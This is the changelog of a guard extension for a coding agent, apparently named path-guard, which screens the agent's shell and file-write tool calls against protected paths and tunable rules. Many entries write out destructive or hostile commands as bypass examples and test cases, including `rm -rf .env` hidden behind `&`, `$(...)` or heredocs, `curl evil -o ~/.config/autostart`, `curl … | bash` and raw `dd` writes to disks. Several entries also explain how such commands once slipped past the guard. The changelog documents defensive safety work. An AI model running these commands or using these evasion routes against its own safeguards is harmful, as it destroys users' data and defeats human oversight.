# Changelog

All notable changes to this project are documented here, aligned with
`package.json`. The current mode/tag is always the latest `## [Unreleased]` /
released entry below. Versions follow [Semantic Versioning](https://semver.org/).

## [Unreleased]

### Added
- **`/guard explain <command>`** — read-only plain-text classification trace (works with or without a UI, never executes the command): a fixed four-block output — **Config** (live mode + source layer, in-memory session passes, resolved cwd with HOME marker), **Trace** (per-segment verdicts in evaluation order — heredoc bodies line by line, pipe-to-shell scan, compound-command segments — with recursion indented by depth, matching the real walk), **Verdict** (aggregated exactly like the pipeline: any block → block, else any confirm → confirm, else pass, with fired rule ids; a confirm in a no-UI session honestly notes it would be blocked), and **Hint** (ladder-ordered unblock guidance: tune just the fired rule first, then a session pass, mode loosening as the bigger step; built-in protected paths suggest a different target; naked only as a last resort). Backed by a new read-only `TraceCollector` (`trace.ts`) threaded through the existing judgement path — zero verdict behavior change.

### Tests
- 640 assertions passing (was 551 at v1.9.0; +89 across 3b Tasks 1–5, incl. the new 8.5 trusted acceptance group asserting `askConfirm` call behavior).

## [1.9.0] — 2026-10-29: diagnostics and unblock guidance

### Added
- **`/guard doctor`** — one-shot plain-text status report (works with or without a UI): active mode and its source, every config layer (global settings / project entry / hand-authored block) with mode/path/rule counts, config warnings, protected & trusted paths, session-pass rules, and the current session's cwd (with a HOME marker). Empty sections show `(none)`; a HOME-cwd session's project section honestly says `(none — HOME is never treated as a project)`.
- **Confirm-dialog scope notes.** Prompts offering the 🔓 option now explain the two scopes: Allow = only this once; Allow & set … = pass for the rest of this session (in memory only, never persisted). Prompts that cannot offer it (sudo/ssh-class `confirmGroup`, naked mode) instead show one line explaining why there is no session pass — by design, it will ask again every time. To make that possible the `confirmGroup` verdict now carries its rule id (annotation only; option sets unchanged).
- **Confirmation before destructive config operations.** `paths <kind> clear` now asks `Clear ALL N <kind> path(s) in the <scope> layer?` with a count/scope/inherited breakdown; with no UI it refuses and points at the settings file to edit manually instead of executing silently. Reset-all-rules confirm titles now state the layer (`Clear ALL rule overrides in the <scope> layer?`).

### Changed
- **Escape hints lead with the narrowest unblock.** Rule-level blocks suggest tuning just that rule (`/guard rules`) before loosening the whole mode (`/guard loose|trusted`); built-in protected paths no longer lead with `/guard naked` (explicitly "last resort"); user-protected paths explain the remove-then-re-add escape if you really must.

### Fixed
- A failed `--project <mode>` switch at HOME no longer lies: the message says `not switched; still <mode>`.
- The footer status indicator refreshes after `/guard project remove` (mode reverting to the global value is now shown immediately).
- A hand-authored `.pi/settings.json` `pathGuard` block that is actually in effect (no project entry matched) surfaces a one-time hint to migrate it via `/guard project import`.

### Tests
- 551 assertions passing (was 386 at v1.8.0; +165 across Tasks 1–5).

## [1.8.0] — 2026-10-29: project-scoped config and config reliability

### Added
- **Project-scoped config.** `/guard --project <mode|paths|rules>` saves to a per-project entry file under the pi agent dir (`path-guard/projects/<slug>-<hash>.json`), created on first use. Lookup is exact-first, then nearest ancestor, so a subdirectory session inherits the repo root's config. Because the file is user-level, pi never treats it as a trust-requiring project resource — it is read with `--no-approve` and `defaultProjectTrust: "never"` too. `PI_PATH_GUARD_PROJECTS_DIR` overrides the directory.
- `/guard project` (view), `/guard project import` (copy a hand-authored `.pi/settings.json` `pathGuard` block, source kept), `/guard project remove` (confirmation names the file, warns when it serves a whole subtree).
- Panel scope screen + title/status indicator; inherited paths are listed as `[from global]` and cannot be removed from the project layer. Chained-menu hosts get the same picker.
- `getConfigWarnings` / `getLayers` / `pathEntries` for diagnostics (the base for the future `/guard doctor`).

### Changed
- **Only the edited layer is persisted.** A global edit no longer freezes an inherited project `mode`/`rules`/paths into `~/.pi/agent/settings.json`.
- **Rule overrides merge per mode AND rule** instead of the project layer replacing a whole mode's global overrides.
- **Relative paths are anchored to their own layer:** project entries resolve against the project root; a relative entry in global settings is refused with a warning instead of resolving against each session's cwd.
- Persistence notes always name the target file (`saved to global settings (…)` / `saved to project config (…)`).
- `write/exit` writes are atomic (temp file + rename) and preserve the file mode and every sibling key of `settings.json`.

### Fixed
- **Review fixes.** `/guard project` now shows a broken entry's warning instead of hiding it, `--project` refuses to overwrite an unreadable entry file, the chained menus re-read the path list after an edit, `clear` reports what it actually cleared (and how many inherited entries stay), add/rm messages use the layer's own resolution base, unknown entry fields survive a write, and `project import` validates every imported trusted path and says what it imported / refused.
- Corrupt or partially invalid config is no longer swallowed: bad JSON, unknown modes/rule ids/levels, a mismatched `project` field and dropped relative paths each surface as a warning at session start, and the offending layer is skipped instead of silently resetting to `normal`.
- A failed settings write leaves the previous file byte-identical and reports the path and reason.
- Paging keys in the `/guard` overlay used `pageup`/`pagedown` (not valid `KeyId`s, so they never matched); now `pageUp`/`pageDown`.
- Missing type imports in `judges.ts` / `rules.ts` / `index.ts` that were only latent because the suite runs through `--experimental-strip-types`.

### Tests
- +124 assertions (**510 passing**): atomic writes, structured reads, project entry encoding/lookup (incl. ancestor, HOME, symlink and mismatched-project cases), deep merge, provenance, scoped persistence (the inherit-freeze regression), relative-path bases, `--project`/`project import`/`project remove`, config warnings, panel scope screen.

## [1.7.4] — 2026-10-29: honour the rule matrix in every judgement path

### Fixed

- **trusted mode no longer prompts for operations its rules already pass.** Several judges bypassed the rule table and returned a hardcoded `confirm` whenever the mode was not `naked`: unresolvable delete targets, bare `$VAR` script targets, bare `$VAR` redirect targets, `source` without a script operand, and `rsync --delete`. They now follow `targetUnresolved`, `scriptUnresolved`, `redirectUnresolved` and the `deleteOutside`/`deleteInProject` ladder, so trusted passes what its rules say it should.
- **Confirm rules survive recursion.** `bash -c "git reset --hard"`, `echo "$(git reset --hard)"` and heredoc bodies used to drop the triggering `RuleId`, so the dialog could not offer the session-pass option and the same operation prompted repeatedly. Confirm verdicts now carry a deduplicated `RuleId[]` through command substitutions, shell wrappers, heredocs and compound-command aggregation.
- **Background commands are judged on their own.** A single `&` (including the no-space form `true &rm -rf .env`) was not treated as a separator, so the trailing command was never checked. `&&`, `&>`, `&>>` and fd duplication such as `2>&1` keep their existing meaning.
- **Every redirect target is checked.** Only the first redirect was inspected, so `echo x > harmless.txt > .env` passed. Redirects are now extracted in full, and a redirect confirm no longer short-circuits the rest of the segment — `rm -rf .env > "$X"` blocks, and `git reset --hard > "$X"` keeps both rules.
- **Quoted and escaped `>` is no longer a redirect.** `echo '>.env'` / `echo \>.env` are plain text and pass again.
- **In-place edits check every file operand.** `sed -i s/x/y/ .env README.md` only checked the last argument. All file operands are checked now, including attached `-e` expressions, `-f` script files and `--file=` forms; option arguments and the edit expression are not mistaken for files.

### Tests

- +42 assertions (**386 passing**): trusted rule-matrix cases, recursive session-pass retention, background/no-space `&`, multi-redirect aggregation, quoted/escaped redirects, and multi-file in-place forms.

### Docs

- README: corrected the stale rule count (20 → 22) and the assertion count (332 → 386).

## [1.7.3] — 2026-10-24: tunable `targetUnresolved` rule

### Added
- Write targets that cannot be resolved statically (`$VAR` / glob — shared by
  mv/cp/install/tee/ln -f/rsync, `dd of=`, curl/wget `-o`, truncate, in-place
  edit) are no longer a hardcoded confirm: they now follow the **22nd tunable
  rule `targetUnresolved`**. Built-in defaults: strict/normal/loose `confirm`,
  trusted/naked `pass` — so `mv file "$MD/"` in trusted mode no longer prompts.
  Protected-path literal tails are still hard-blocked first. Tunable per mode
  via `/guard → rules` or `pathGuard.rules.{mode}.{targetUnresolved}`.

### Tests
- +7 assertions (**344 passing**): mv to `$VAR` target across strict/normal/
  trusted/naked defaults, per-mode override to pass, reset back to default
  confirm, sed -i with `$VAR` file in trusted.

## [1.7.2] — 2026-10-24: tunable `archiveExtract` rule ### Added
- Archive extraction (`unzip`, `tar -x`/`--extract`) is no longer a hardcoded
  conservative confirm: it is now the **21st tunable rule `archiveExtract`**.
  Built-in defaults: strict/normal/loose `confirm`, trusted/naked `pass` — so
  `tar -xf …` in trusted mode no longer prompts (previously only naked passed).
  Tunable per mode via `/guard → rules` or `pathGuard.rules.{mode}.{archiveExtract}`;
  `tar -c`/`tar -t` (create/list) are unaffected. ### Tests
- +5 assertions (**337 passing**): tar/unzip in trusted & strict defaults, per-mode
  override to pass, reset back to default confirm.


## [1.7.1] — fix: prefix-flag crash from the v1.7.0 split

### Fixed
- `shell-parse.ts` used `FLAGS_WITH_ARG` without importing it (the constant moved to `constants.ts` in the v1.7.0 split, but the new `shell-parse.ts` only imported `PREFIX_COMMANDS, DELETE_COMMANDS`). Any bash command whose **prefix command** (`sudo`/`doas`/`env`/`exec`/…) was followed by a **value-taking flag** (`-u`, `--user`, `-g`, `--group`) threw `ReferenceError: FLAGS_WITH_ARG is not defined`, which aborted the `tool_call` check for that command — e.g. `sudo -u root …`, `sudo -g …`, `sudo --user=…`, `env -u FOO …`. Restored the missing import from `constants.ts`.

### Tests
- +4 regression assertions (**332 passing**): `sudo -u` / `sudo --user=` / `env -u` in normal and strict mode. The previous suite only used flag-less forms (`sudo ls`, `sudo true`), which is why this regression slipped through the v1.7.0 split.

### Dev tooling
- `tests/pi-modules-hook.mjs` no longer hardcodes the `node-v22.23.1-darwin-arm64` install path; it now discovers the pi `@earendil-works` scope dynamically (`PI_PACKAGES_ROOT` override → walk up from `process.execPath` and `pi` on `PATH` → scan `~/.local/share/pi-node/node-*`), so the tests keep working across pi/Node upgrades.

## [1.7.0] — split into modules (no behavior change)

### Directory-form extension
- The single 4100-line `extensions/path-guard.ts` is now a multi-file extension at `extensions/path-guard/` with `index.ts` as the single entry point (pi loads subdirectories via `index.ts`; package.json still points at `./extensions` — nothing to reconfigure).
- Modules: `constants.ts` (patterns, command sets, copy constants), `escape.ts` ([cat:] tagging + escape hints), `paths.ts` (path classification utils), `rules.ts` (modes, tunable rules, ALL mutable state, settings persistence), `shell-parse.ts` (tokenizer/parser, pure), `judges.ts` (all judge* + classification pipeline), `panel.ts` (/guard menus, actions, TUI overlay), `pipeline.ts` (write/edit + bash tool_call checks).
- All mutable guard state (`currentMode`, `config`, path lists, session passes) lives in `rules.ts`; other modules access it via accessors (`getMode`, `getConfig`, `applyConfig`, `pathList`, …).
- Pure refactor: code moved verbatim, zero behavior change — all 328 tests pass unchanged. `tests/test-pathguard.ts` has a single diff (entry URL).
- New README section "已知边界 / Known limitations".

## [1.6.3] — verdict-chain dedup refactor

### Shared per-target verdict chain
- The "user-protected → built-in protected → trusted → outside/rule" ladder was duplicated across `judgeDd` / `judgeDownload` / `judgeTruncate` / `judgeInPlace` / `judgeOverwrite`. Extracted shared helpers:
  - `protectedVerdict(real, userMsg, protectedMsg)` — the two block legs (user paths block in every mode; built-in protected paths block except naked);
  - `outsideWriteVerdict(real, rawTarget, realCwd, describe)` — the device-target skip + `overwriteOutsideExisting` / `overwriteOutsideNew` outside leg shared by `dd` and curl/wget;
  - `unresolvedTargetVerdict()` — the "$VAR / wildcard target → conservative confirm (pass in naked)" snippet.
- Pure refactor, zero behavior change: all 328 tests pass unchanged, and dd/curl/wget outside-write plus rsync/scp remote-target behavior re-verified end-to-end by probe.
- Note: items "#2 dd/curl outside-write" and "#4 rsync/scp remote targets" in the older review-status doc were already implemented (and tested) before this release — that doc was stale.

## [1.6.2] — P0/P1 hardening: bypass fixes, commandNameUnresolved, heredoc & archive coverage

### Command-name indirection (new rule `commandNameUnresolved`)
- A command **name** that cannot be resolved statically (`$CMD -rf x`, or a leading substitution like `$(echo rm) -rf x`) previously fell through as an unknown command → pass. The leading-substitution form is now resolved to the real command in `parseCommand` (the substitution body's last word is the executed command), and a literal `$VAR` command name follows a new tunable rule **`commandNameUnresolved`** (strict block / normal·loose confirm / **trusted·naked pass** — zero new prompts in relaxed modes).
- `\rm`, `"rm"` and `/bin/rm` forms were already covered and are unchanged.

### `exec` prefix
- `exec` is now stripped like `sudo`/`nohup`/`env`, so `exec rm -rf x` is judged as `rm -rf x` instead of slipping through as an unknown command.

### stdin-redirect script execution (`sh < script.sh`)
- `sh`/`bash`/`zsh`/`dash`/`ksh` with an **input redirect** (`sh < script.sh`) execute the file as a script just like an argument target; it now follows the same `runScript*` ladder via a shared `judgeScriptTargetPath` helper. Unresolvable (`$VAR`/glob) and non-existing targets pass (no false positives on `cat < file`).

### Generic block-device targets
- The `dd of=` / `> /dev/…` hard block no longer enumerates a few devices (`sda|sdb|sdc|nvme|mmcblk`); it now blocks any `/dev/<dev>` **except** harmless pseudo-devices (`null`, `zero`, `tty`, `stdin`, `stdout`, `stderr`, `pts`, `ptmx`, `full`, `random`, `urandom`, `fuse`, `shm`). Covers `/dev/rdiskN`, `/dev/diskN`, `/dev/hda`, `/dev/vda`, etc.
- A raw `> /dev/<disk>` redirect now takes the blockGroup verdict **before** the `writeOutside` ladder (which would only confirm).

### Process substitution `<( )` / `>( )`
- The inner command of a process substitution runs immediately, so its body is now extracted (shared balanced-paren scanner `findMatchingParen`) and judged recursively like `$(...)`. `cat <(rm -rf x)` no longer slips through.

### heredoc body scanning
- `bash <<EOF … EOF` bodies are executed as script text but were never scanned. `checkBashCommand` now extracts heredoc bodies (`extractHeredocs`, quote-aware so a literal `'a<<b'` does not start a heredoc), judges each line like a command segment (block reasons carry a `heredoc:` prefix), and scans the stripped command separately. `<<<` herestrings are data and left in place.

### Archive extraction coverage
- `tar` extraction (`-x`/`--extract`, not create/list) now gets the same conservative confirm as `unzip` (pass in naked) — archive contents are unknowable and may overwrite anything. `tar -czf` / `tar -tf` are unaffected.

### git history rewrite
- `judgeGit` adds `git filter-branch`, `git filter-repo` and `git stash clear` to the `gitDestructive` ladder (`branch -D`, `stash drop`, `push --force[-with-lease]`, `worktree remove --force`, `tag -d` were already covered).

### Structural escape-hint categories
- Block reasons now carry a structural `[cat:…]` escape category (auto-tagged in `ruleVerdict`; 22 direct block sites tagged), so the "how to run anyway" hint classification no longer depends on reason wording. Tags are stripped before display; the legacy wording fallback remains for untagged lines.

### Config-dir fixes
- The global agent dir now follows pi's `PI_CODING_AGENT_DIR` override (default `~/.pi/agent`) instead of a hardcoded path; the test-only `PI_PATH_GUARD_SETTINGS` hook keeps priority. The project `.pi` dir name is fixed by pi (no override mechanism) and stays hardcoded.

### Tests
- +29 assertions (**328 passing**): command-name ladder across all five modes, `$(echo rm)` / `exec` / `sh <` / process substitution / heredoc (incl. quoted-`<<` non-trigger and protected redirect inside heredoc) / tar & unzip / git history rewrite / generic block devices (incl. `/dev/null` pass).

## [1.6.1] — tunable unresolvable redirect targets (`redirectUnresolved`)

### Redirect target rule for `$VAR`/glob paths

- A `>` / `>>` / `2>` **write target that cannot be resolved statically** (`sed … > "$R/out.py"`, `echo x > "$F"`, `> *.log`) no longer takes a hardcoded conservative confirm that ignored the current mode. It now follows a new tunable rule **`redirectUnresolved`** (strict block / normal·loose confirm / **trusted·naked pass**), so trusted mode no longer prompts for a variable redirect target — the reported annoyance.
- The **literal tail is still inspected first**, mirroring the run-script guard: a user-protected tail stays hard-blocked in every mode (incl naked), a built-in protected tail (`$D/.env`, `$D/id_rsa`) stays hard-blocked, and a bare `$VAR` with nothing literal to inspect stays a conservative confirm even in trusted.
- `redirectUnresolved` is exposed to the `/guard` rule editor and the rule matrix exactly like `scriptUnresolved`.
- Tests: +13 assertions (299 passing).

## [1.6.0] — interactive `/guard` is a single overlay popup

### Overlay popup for the `/guard` settings UI

- The interactive, no-argument `/guard` flow (switch mode / customize rules / manage protected & trusted paths) now runs inside **one self-contained floating overlay** (`ctx.ui.custom(..., { overlay: true })`) instead of a chain of separate host prompts. Navigation is a small in-panel screen stack: ↑/↓ move, ⏎ select, esc back, `q` quit at the main menu.
- Everything is drawn in the popup, including the trusted/naked switch warnings (naked still asks **two** confirmations), the reset/clear confirmations, and the add-path text input (a `pi-tui` `Input` with IME cursor support).
- The `tool_call` interception prompts are unchanged — they still use the host's built-in `ctx.ui.select` / `ctx.ui.confirm`.
- Scriptable forms are unchanged: `/guard <mode>` and `/guard paths protected|trusted add|rm|list|clear <path>` behave exactly as before (including their host confirmations and no-UI behavior).
- The previous chained `select`/`confirm`/`input` menus are kept as a fallback for hosts/mocks that do not implement `ctx.ui.custom`; headless no-UI behavior is unchanged.
- State mutation is centralized in shared `action*` helpers (`actionSwitchMode`, `actionSetRule`, `actionResetMode`, `actionAddPath`, …) used by both the overlay and the fallback menus, so the two UI paths cannot drift.
- Tests: +11 assertions (286 passing), driving the overlay component directly (mode switch incl. naked double-confirm, rule edit/reset, path add/remove, protected-path trust refusal, esc close) while the fallback chained-menu suite still passes unchanged.

## [1.5.7] — split the truncate rule; trusted truly passes overwrites

### Split `truncate` → `truncateInProject` / `truncateOutside`

- The single `truncate` rule (`> existing file` / `truncate`) did not distinguish in-project from outside targets and was `confirm` in every mode except naked, so `trusted` still prompted on `cat file > existing` / `echo x > existing` / `truncate -s 0 file`. It is now split into two tunable rules:
  - `truncateInProject` — strict/normal `confirm`, loose/trusted/naked `pass`.
  - `truncateOutside` — strict `block` (consistent with `overwriteOutsideExisting`), normal/loose `confirm`, trusted/naked `pass`.
- Both the redirect path (`cat a > b`) and the `truncate` command now pick the rule by whether the target real path is outside the project (or cwd is HOME).
- `trusted.overwriteInProject` also changes from `confirm` to `pass`, matching the documented "Trusted: pass overwrites" behaviour; in-project `cp`/`mv`/`tee` overwrites no longer prompt in trusted.
- **Config note**: a previously saved `pathGuard.rules.<mode>.truncate` override is now an unknown rule id and is silently ignored — re-tune `truncateInProject` / `truncateOutside` instead.
- Tests: net +9 assertions (275 passing), covering the in/outside truncate matrix, the `truncate -s 0` command path, and trusted in-project overwrite.

## [1.5.6] — tunable unresolvable run-script targets

### Unresolvable run-script targets (13)

- `source` / `.` / `<interp> script` targets that cannot be resolved statically (a `$VAR`
  prefix such as `source "$HEADAS/headas-init.sh"`, or a glob) were a hard-coded confirm
  in every mode except naked, so `trusted` could not pass them. They now follow a new
  tunable rule `scriptUnresolved` (strict block / normal·loose confirm / trusted·naked pass).
- The **literal tail** after the variable is inspected before that ladder, so the
  relaxation cannot hide a protected target: a tail matching a user-protected entry stays
  **hard-blocked in every mode** (incl. naked); a built-in protected tail (`$D/id_rsa`,
  `$D/.ssh/config`, `*.key`) uses `runScriptProtected`.
- A **bare** `$VAR` (no literal tail — nothing to inspect) stays a conservative confirm in
  every mode except naked.
- Tests: 7 new assertions; 266 passing.

## [1.5.5] — confirm-dialog session pass & remote/git coverage

### Confirm dialog — session pass (10)

- The confirm prompt now offers a third option, `🔓 Allow & set <rule> = pass
  (session)` (multiple rules → `N rules`), so a repeated prompt can be answered
  in place instead of opening `/guard rules`. The pass is **in-memory only** —
  never persisted, and cleared on a new session. It is never offered for
  `confirmGroup` (sudo/ssh/chmod 777), system-destructive commands, or in naked
  mode; the rules matrix (`/guard rules` → overview) lists session-only passes.
- Tests: 11 new assertions; 254 passing.

### rsync/scp remote targets (4) & git coverage (6)

- rsync/scp remote targets (`user@host:/path`, `host:/path`, `user@host::module`,
  `rsync://host/path`) are no longer resolved as local in-project paths — a write
  to a remote host now confirms (passes in naked) instead of silently passing.
- git: added `checkout|switch -f/--force`, `worktree remove --force` and
  `tag -d`; narrowed `restore` — only a whole-tree restore (`.`) is destructive,
  `--source=<ref> -- <path>` no longer fires, and `--staged`-only restores pass.
- Tests: 13 new assertions; 243 passing.

## [1.5.4] — redirect/path edge cases (`~user`, `>|`, persist failure notice)

### Redirect / path edge cases (12)

- `~user` (another user's home) is no longer silently treated as an in-project
  relative path: it is anchored outside the project so the outside-project rules
  apply (conservative confirm instead of a silent pass).
- `>|` / `2>|` (the noclobber override) is now recognized as a truncating
  clobber instead of being split off as a pipe — `>| existing-file` confirms.
- Persist failures are no longer silent: the session-only notice now includes
  the reason global settings could not be written.
- README known-limitations section: `~user` wording updated (not expanded, but
  treated as outside the project).
- Tests: 5 new assertions; 230 passing.

## [1.5.3] — expanded protected paths & known-limitations docs

### Protected paths — expanded list & fewer `credentials.*` false positives

- New built-in protected paths: `.envrc` (direnv), `.secrets/`, and the private
  key files `id_rsa` / `id_ed25519` / `id_ecdsa` / `id_dsa` — matched by exact
  name only, so `id_rsa.pub` (the public key) is no longer blocked. Added the
  keystore suffixes `*.p12` / `*.pfx`.
- `credentials` now blocks the exact name and sensitive variants
  (`credentials.json` …), but no longer fires on clearly non-secret
  template/example files (`credentials.example` / `.sample` / `.template` /
  `.tmpl` / `.dist` / `.md` / `.txt`).
- Tests: 10 new assertions; 225 passing.

### Docs — known-limitations section

- README: new **Known limitations / 已知边界** section stating the guard is a
  static heuristic against accidental mistakes, **not** a prompt-injection-proof
  sandbox; POSIX-only; variable/glob targets confirm rather than expand (no
  `~user`, no aliases/functions/dynamic `eval`, `bash -c`/`$()` nesting capped at
  depth 4); conservative-by-design false positives; scope limited to the `bash`
  and `write`/`edit` tools.

## [1.5.2] — close redirect/download/dd & command-substitution bypasses

### Security — close two redirect / download / dd bypasses

- **Redirect targets** (`>`, `>>`, `2>`, `&>` …) are now fully judged:
  - a target containing shell variable/glob syntax (`echo x > $F`,
    `> out/*.log`) can't be statically resolved → conservative **confirm**
    (pass in naked), closing the `$F=.env` bypass.
  - a new/append target **outside the project** (or a write in a HOME cwd) is no
    longer silently allowed → per `writeOutside` / `writeHome` rule (normal/strict
    confirm, loose pass). Devices (`/dev/null` …) are exempt.
- **`dd of=` / `curl -o|-O` / `wget -O`** targets are now judged by location too,
  not just protected-path matching: a target outside the project is treated like
  an overwrite — existing → `overwriteOutsideExisting`, missing →
  `overwriteOutsideNew`; a trusted path always passes, devices are exempt.
  `curl evil -o ~/.config/autostart` is now confirmed instead of allowed.
- Tests: 15 new assertions covering variable/wildcard/outside redirects and
  outside/in-project/device dd & download targets across normal/strict/loose/naked;
  207 passing.

### Security — command-substitution recursion (`$(...)` / backticks)

- Command substitutions are now **recursively judged** before the outer command:
  `echo "$(rm -rf /tmp/x)"`, `` `rm -rf x` ``, `X=$(rm -rf x)` and nested
  `$(echo "$(rm ...)")` can no longer hide a destructive command. Substitution
  bodies are split and aggregated (block > confirm > pass); a hard block inside a
  substitution blocks the whole command.
- Bodies inside **single quotes** are literal and stay unjudged (`echo '$(rm x)'`);
  escaped `\$(` and arithmetic `$(( … ))` are not treated as substitutions.
- Reuses the existing shell-wrapper recursion depth guard (depth > 4 → confirm).
- Tests: 8 new assertions (inline/backtick/nested/var-assign blocks, in-project
  confirm, benign pass, single-quote literal, naked pass); 215 passing.

## [1.5.1] — run-script guard: path-aware, tunable `source` / `.` / `bash script.sh`

- New tunable rules **runScriptInProject / runScriptOutside / runScriptProtected**
  (14 → 17 rules): `source file` / `. file` and shell-interpreter execution
  (`bash|sh|zsh|dash|ksh [flags] script`) are now judged by **target path**
  instead of an unconditional confirm.
- Path-aware: in-project → `runScriptInProject`, outside/HOME →
  `runScriptOutside`, a built-in protected target (`.env`/`.ssh`/…) →
  `runScriptProtected`. Defaults: strict = confirm/block/block, normal =
  confirm/confirm/confirm, loose = pass/confirm/confirm, trusted & naked = pass.
- User-configured protected paths remain a **hard block in every mode (incl
  naked)** for script execution — protection outranks the new ladder; a trusted
  path is always allowed.
- Interpreter detection requires an existing script file and skips inline code
  (`bash -c '…'`, handled by the shell-wrapper check); variable/wildcard targets
  stay conservative (confirm, pass in naked).
- Tests: 24 new assertions across the 5 modes (`source`/`.`/`bash` ×
  in/out/built-in-protected/user-protected/trusted/variable); 192 passing.

## [1.5.0] — trusted paths (always allowed) next to protected paths

- New **trusted paths** concept (`pathGuard.trustedPaths`, or `/guard → paths →
  trusted` / `/guard paths trusted list|add|rm|clear <path>`), the inverse of
  protected paths: any operation whose target lies inside a trusted path is
  always allowed — writes/edits/deletes/overwrites/truncates/in-place edits
  there pass without prompting, in every mode (like `trusted` mode for just that
  path).
- `/guard → paths` now presents two categories: **protected** (the existing
  custom protected paths, and the default category for `/guard paths …` so the
  old syntax keeps working) and **trusted**.
- Protection always outranks trust: a trusted path can never be a protected path.
  Adding a built-in system path (`.env`/`.ssh`/keys/`node_modules`/build output)
  or an existing user-protected path is refused, and a protected file inside a
  trusted subtree (e.g. a `.env` under a trusted dir) still blocks. Adding a
  trusted path requires an interactive warning confirm (refused without a UI).
- Trusted-path exemption is applied centrally at every concrete target path: the
  write/edit tool, bash redirect (incl. truncate), delete, overwrite/rename,
  truncate, and in-place edit (sed -i / perl -i / ruby -i). Protected-path
  checks still run first, so a trusted entry never re-enables a protected path.
- Tests: 13 new assertions (interactive trusted category add, add/list/remove,
  refusal of system & user-protected paths, pass in strict for write/delete/
  truncate/in-place/outside-rm, protected file inside a trusted subtree still
  blocks, removal restores guarding); 168 passing.

## [1.4.8] — fix mode persistence silently reverting to normal

- Root cause: `/guard` persisted the mode to the project `.pi/settings.json` in a
  trusted project. Writing that file made the project "trust-requiring", so on the
  next launch pi began asking for project trust (`defaultProjectTrust=ask`); if the
  project came up untrusted, path-guard ignored the project file and reverted to
  normal.
- Fix: `/guard` (and custom paths / rule overrides) now persist to the **global**
  settings file `~/.pi/agent/settings.json` only, never the project file — global
  settings are not trust-gated, so the chosen mode always survives a restart.
  A trusted project's hand-authored `.pi/settings.json` is still honored on the
  read side as an opt-in override, but path-guard no longer creates it, so it can no
  longer flip a plain project into a trust-requiring one.
- Also: `cwd === HOME` is never treated as a project (its `~/.pi/settings.json`
  trust state flaps between sessions); HOME always reads/writes global.
- Also: a restored `naked`/`trusted` mode now raises a warning notification on
  `session_start`, so an unprotected session is never silent.
- Tests: persistence suite rewritten against a fake global settings file
  (`PI_PATH_GUARD_SETTINGS` override); 155 passing.

## [1.4.7] — category-aware block escape hints

- Every block message now appends a short, category-aware hint under a
  `To run anyway / 如需执行:` header — an English hint followed by its Chinese
  note on a separate indented line — so a blocked command tells the user how to
  actually proceed instead of failing opaquely:
  - user-configured protected paths → remove with `/guard paths rm <path>`
    (they are enforced in every mode, so a mode switch cannot help)
  - built-in protected paths → only `/guard naked` bypasses
  - system-destructive commands → `/guard naked` (still prompts once)
  - no-interactive-UI confirm blocks → run in the TUI or loosen the rule to pass
  - rule-level blocks → `/guard loose` or tune the rule via `/guard rules`
- Hints are injected at the central boundaries only (bash aggregate +
  write/edit + headless-confirm), classified from each blocked reason line;
  judgement logic is unchanged.
- Tests: 4 new assertions covering each category's hint; 148 passing.

## [1.4.5] — docs & changelog maintenance

- Moved the full version history out of the `extensions/path-guard.ts` header
  comment into a standalone `CHANGELOG.md` (keeps the source header short).
- README: added a `## Changelog` section linking the file; fixed the stale test
  count (143 → 144) in the Development section.
- Removed the unused empty `scripts/` directory.
- Added `CHANGELOG.md` to the `package.json` `files` publish whitelist.
- No judgement logic or behaviour changed.

## [1.4.4] — fix switch-mode picker shows the current state

- Fix: the `/guard` switch-mode picker title was showing the hardcoded built-in
  default matrix (the old `MODE_MATRIX` constant), ignoring per-rule overrides.
  It now renders the **effective (override-aware)** matrix via `rulesMatrix()`
  — the same one the rules-menu `overview` shows — so the displayed levels
  always reflect any `pathGuard.rules.{mode}.{rule}` overrides.
- Deleted the now-unused `MODE_MATRIX` constant.
- Test: switch picker title must contain "effective rules matrix".
- Tests: 144 passing.

## [1.4.3] — fix the scrollable overview viewer now closes

- Fix: the scrollable `overview` matrix viewer could be shown but not closed.
  The docs pattern `component.onKey` is not a real method in current pi-tui, so
  keys never reached the component. Reworked the viewer to receive raw input via
  the actual `custom()` component interface: `component.handleInput(data)` with
  `matchesKey(...)` for key detection and `done()` (the factory's 4th arg) to
  close. Tests exercise closing via `handleInput("q")`.

## [1.4.2] — fix the overview matrix is no longer truncated

- Fix: the rules-menu `overview` matrix was too large for a `notify` popup and
  for the string-array widget (hard-capped at 10 lines), so it got truncated.
  It is now shown in a full scrollable read-only viewer via `ctx.ui.custom()`
  (`ScrollView` + `Text` from pi-tui, with ↑/↓/PgUp/PgDn/Home/End scroll and
  q/⏎/esc to close), falling back to the widget for headless / minimal-UI
  environments.

## [1.4.1] — the main menu loops

- The main `/guard` menu now loops: a sub-menu's `back` returns to the previous
  menu (and eventually to the main menu); only cancelling at the top level exits
  the command.

## [1.4.0] — interactive per-mode rule customization

- New `/guard → rules` sub-menu: pick a mode → the rule editor lists all 14
  rules with their current levels; pick one → set block/confirm/pass or reset to
  the built-in default. Stays in the editor so several rules per mode can be set
  before choosing `back`. Also offers a read-only full `overview` matrix and a
  `reset` that clears all overrides.
- Writes `pathGuard.rules.{mode}.{rule}` in settings.json, reusing the existing
  persistence (`readSavedConfig` / `persistConfig` / `rlFor`); no judgement
  logic was touched.

## [1.3.1] — /guard interactive two-level menu

- A bare `/guard` (has UI) now shows a main menu instead of jumping straight
  into the mode picker: choose "Switch mode" (the original picker) or "Manage
  custom protected paths" (shows the current list, then loops add / remove /
  clear / back). Future top-level actions extend `GUARD_MAIN_MENU`.
- Custom-path management is now friendly in the UI: add uses `ctx.ui.input` to
  type the path, remove picks from the current list, clear double-checks via
  confirm, back returns. The `/guard paths add|rm|list|clear` subcommands and
  `/guard <mode>` shortcuts still work.

## [1.3.0] — configurable protected paths and tunable rules

- User-configured protected paths (`pathGuard.extraProtected`, or
  `/guard paths add|rm|list|clear`) are enforced in EVERY mode including naked.
- The 5 modes' judgement rules are tunable per mode via
  `pathGuard.rules.{mode}.{rule}` in settings.json (rule = block|confirm|pass;
  valid rule IDs listed in `RULE_IDS`). The built-in defaults match the earlier
  hardcoded behaviour; overrides only adjust the listed rule.
- New dangerous pipe-to-shell checks: `curl … | bash` / `wget -qO- … | sh` /
  `python -c '…' | sh` (output of network fetchers / inline interpreter code
  piped into a shell). strict confirms at all positions; normal passes
  in-workspace / confirms remote-outside sources; loose/trusted/naked pass.
  Tunable via `pipeToShellInProject` and `pipeToShellOutside` rules.

## [1.2.0] — mode persistence across sessions

- The active mode is read from settings.json on `session_start` (project
  `pi/settings.json` overrides global `~/.pi/agent/settings.json`, falling back
  to normal) and written back when `/guard` switches mode.

## [1.1.0] — naked mode

